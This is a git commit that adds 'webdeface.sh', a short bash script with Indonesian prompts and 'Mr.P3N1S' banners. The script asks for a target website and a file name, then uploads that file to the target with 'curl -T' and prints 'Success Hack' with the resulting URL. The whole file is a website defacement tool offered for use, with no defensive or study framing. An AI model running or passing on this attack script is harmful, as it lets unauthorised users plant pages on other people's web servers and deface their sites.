c236fe7821e213ad1a7ed7cce9906804b9c86034
TukangIseng1 <49801821+TukangIseng1@users.noreply.github.com>
2019-04-20 12:39:36 +0700

    Add files via upload

---
+++ webdeface.sh
@@ -0,0 +1,8 @@
+clear
+cowsay -f eyes 'Mr.P3N1S' | lolcat
+figlet -f slant "Mr.P3N1S" | lolcat
+read -p "Masukan Web Target =>" target;
+read -p "Masukan Nama Script =>" script;
+curl -T /sdcard$script $target
+echo " [!] Success Hack =>" $target/$script
+
